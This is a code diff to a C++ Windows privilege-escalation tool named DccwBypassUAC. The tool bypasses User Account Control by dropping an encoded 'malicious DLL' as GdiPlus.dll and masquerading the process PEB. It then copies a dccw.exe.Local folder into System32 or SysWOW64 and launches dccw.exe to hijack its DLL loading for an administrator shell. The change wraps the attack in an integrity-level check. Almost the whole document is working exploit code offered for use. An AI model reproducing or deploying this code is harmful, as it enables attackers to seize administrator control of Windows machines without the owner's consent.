@@ -15,7 +15,6 @@
 #pragma comment(lib, "crypt32.lib") 
 #pragma comment(lib, "Cabinet.lib")
 
-
 BOOL MasqueradePEB() {
 
 	typedef struct _UNICODE_STRING {
@@ -520,7 +519,7 @@ BOOL removeFilesAndDirectories(LPCWSTR targetedDirectories) {
 			success = FALSE;
 		}
 	}
-	
+
 	if (!RemoveDirectory(L"dccw.exe.Local")) {
 		success = FALSE;
 	}
@@ -532,74 +531,116 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	if (argc == 2) {
 
-		WIN32_FIND_DATA FindFileData;
-		HANDLE hFind;
-		LPCWSTR folderName;
-		LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
-		LPCWSTR destPath;
-		GdiPlus32 gdiplus32;
-		LPWSTR version = CharLower(argv[1]);
+		HANDLE hToken;
+		HANDLE hProcess;
 
-		if (wcscmp(version, L"x86") == 0) {
-			destPath = L"C:\\Windows\\System32";
-			folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
-		} else if (wcscmp(version, L"x64") == 0) {
-			destPath = L"C:\\Windows\\SysWOW64";
-			folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
-		} else {
-			wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
-			wprintf(L" For example : \n");
-			wprintf(L" > DccwBypassUAC.exe x86\n");
-			return 1;
-		}
+		DWORD dwLengthNeeded;
+		DWORD dwError = ERROR_SUCCESS;
 
-		wprintf(L" [*] Creating temporary folders...\n");
-		if (!createDirectories(targetedDirectories)) {
-			wprintf(L" [-] Error! Cannot create the necessary directories!");
-			return 1;
-		}
+		PTOKEN_MANDATORY_LABEL pTIL = NULL;
+		LPWSTR pStringSid;
+		DWORD dwIntegrityLevel;
 
-		wprintf(L" [*] Extracting the malicious DLL..\n");
-		CHAR *gdiplus = gdiplus32.getEncodedDLL();
-		std::vector <std::wstring> dirNames;
-		dirNames = getDirectories(targetedDirectories);
-		for (int i = 0; i < dirNames.size(); i++) {
-			std::wstring filename(L"\\GdiPlus.dll");
-			std::wstring path = dirNames.at(i) + filename;
-			LPCWSTR finalPath = path.c_str();
-			if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
-				wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
-				removeFilesAndDirectories(targetedDirectories);
-				return 1;
+		hProcess = GetCurrentProcess();
+		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
+			// Get the Integrity level.
+			if (!GetTokenInformation(hToken, TokenIntegrityLevel,
+				NULL, 0, &dwLengthNeeded)) {
+				dwError = GetLastError();
+				if (dwError == ERROR_INSUFFICIENT_BUFFER) {
+					pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
+						dwLengthNeeded);
+					if (pTIL != NULL) {
+						if (GetTokenInformation(hToken, TokenIntegrityLevel,
+							pTIL, dwLengthNeeded, &dwLengthNeeded)) {
+							dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
+								(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
+
+							if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
+
+								WIN32_FIND_DATA FindFileData;
+								HANDLE hFind;
+								LPCWSTR folderName;
+								LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
+								LPCWSTR destPath;
+								GdiPlus32 gdiplus32;
+								LPWSTR version = CharLower(argv[1]);
+
+								if (wcscmp(version, L"x86") == 0) {
+									destPath = L"C:\\Windows\\System32";
+									folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
+								}
+								else if (wcscmp(version, L"x64") == 0) {
+									destPath = L"C:\\Windows\\SysWOW64";
+									folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
+								}
+								else {
+									wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
+									wprintf(L" For example : \n");
+									wprintf(L" > DccwBypassUAC.exe x86\n");
+									return 1;
+								}
+
+								wprintf(L" [*] Creating temporary folders...\n");
+								if (!createDirectories(targetedDirectories)) {
+									wprintf(L" [-] Error! Cannot create the necessary directories!");
+									return 1;
+								}
+
+								wprintf(L" [*] Extracting the malicious DLL..\n");
+								CHAR *gdiplus = gdiplus32.getEncodedDLL();
+								std::vector <std::wstring> dirNames;
+								dirNames = getDirectories(targetedDirectories);
+								for (int i = 0; i < dirNames.size(); i++) {
+									std::wstring filename(L"\\GdiPlus.dll");
+									std::wstring path = dirNames.at(i) + filename;
+									LPCWSTR finalPath = path.c_str();
+									if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
+										wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
+										removeFilesAndDirectories(targetedDirectories);
+										return 1;
+									}
+								}
+
+								wprintf(L" [*] Masquerading the PEB...\n");
+								if (!IFileOperationCopy(destPath)) {
+									removeFilesAndDirectories(targetedDirectories);
+									return 1;
+								}
+
+								hFind = FindFirstFile(folderName, &FindFileData);
+								if (hFind == INVALID_HANDLE_VALUE) {
+									wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
+									removeFilesAndDirectories(targetedDirectories);
+									return 1;
+								} else {
+									FindClose(hFind);
+								}
+
+								wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
+
+								ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
+
+								IFileOperationDelete(destPath);
+								removeFilesAndDirectories(targetedDirectories);
+
+							} else {
+								// High or System Integrity
+								wprintf(L"You already have Administrator rights! There is no need to execute the script ;)\n");
+							}
+						}
+						LocalFree(pTIL);
+					}
+				}
 			}
+			CloseHandle(hToken);
 		}
-
-		wprintf(L" [*] Masquerading the PEB...\n");
-		if (!IFileOperationCopy(destPath)) {
-			removeFilesAndDirectories(targetedDirectories);
-			return 1;
-		}
-
-		hFind = FindFirstFile(folderName, &FindFileData);
-		if (hFind == INVALID_HANDLE_VALUE) {
-			wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
-			removeFilesAndDirectories(targetedDirectories);
-			return 1;
-		}
-		else {
-			FindClose(hFind);
-		}
-
-		wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
-
-		ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
-
-		IFileOperationDelete(destPath);
-		removeFilesAndDirectories(targetedDirectories);
-	} else {
+	}
+	else {
 		wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
 		wprintf(L" For example : \n");
 		wprintf(L" > DccwBypassUAC.exe x86\n");
+		wprintf(L" > DccwBypassUAC.exe x64\n");
 	}
 	return 0;
 }
